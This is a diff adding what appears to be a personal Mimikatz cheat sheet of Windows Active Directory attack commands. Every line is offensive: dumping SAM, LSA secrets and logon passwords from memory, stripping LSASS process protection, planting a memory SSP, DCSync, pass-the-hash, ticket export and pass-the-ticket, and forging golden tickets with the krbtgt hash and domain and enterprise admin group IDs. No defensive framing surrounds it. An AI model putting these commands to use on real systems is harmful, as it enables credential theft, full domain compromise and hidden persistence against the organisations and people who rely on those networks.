@@ -1,0 +1,53 @@
+privilege::debug
+token::elevate
+lsadump::secrets
+lsadump::sam
+lsadump::lsa
+sekurlsa::logonpasswords
+sekurlsa::ekeys
+
+sekurlsa::pth /user:<ADMIN Username> /domain:<Fully Qualified Domain Name> /ntlm:<Administrator NTLM Hash>
+
+mimidrv.sys:
+!+
+!processprotect /process:lsass.exe /remove
+
+mimilib.dll:
+misc::memssp
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+lsadump::dcsync /domain:<Fully Qualified Domain Name> /user:<ADMIN Username>
+
+sekurlsa::tickets /export
+kerberos::ptt ruserious.kirbi
+
+*******************************************************************************************************************************************************
+
+whoami /user
+
+net localgroup administrators /domain
+
+In DC Machine:
+sekurlsa::krbtgt
+(or)
+Dump krbtgt NTLM hash from memory
+LM:NTLM
+
+kerberos::golden /user:<DOMAIN ADMIN NAME from "net localgroup administrators /domain"> /domain:<DOMAIN NAME from "whoami /user"> /sid:<SID from "whoami /user"> /sids:<Additional SID for Forest> /krbtgt:<NTLM HASH from "sekurlsa::krbtgt"> /startoffset:0 /endin:600 /renewmax:10080 /ptt
+
+kerberos::tgt
+
+*******************************************************************************************************************************************************
+
+lsadump::lsa /inject /name:krbtgt
+
+kerberos::golden /domain:ADIOS /sid:<SID> /sids:<Additional SID for Forest> /rc4:<RC4 i.e NTLM hash> /user:l33t /id:0xffffffff /groups:512,513,518,519,520 /ticket:ruserious.kirbi
+
+kerberos::golden /domain:ADIOS /sid:<SID> /sids:<Additional SID for Forest> /aes256:<AES256 string> /user:l33t /id:0xffffffff /groups:512,513,518,519,520 /ticket:ruserious.kirbi
+
+kerberos::ptt ruserious.kirbi
+
+kerberos::tgt
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
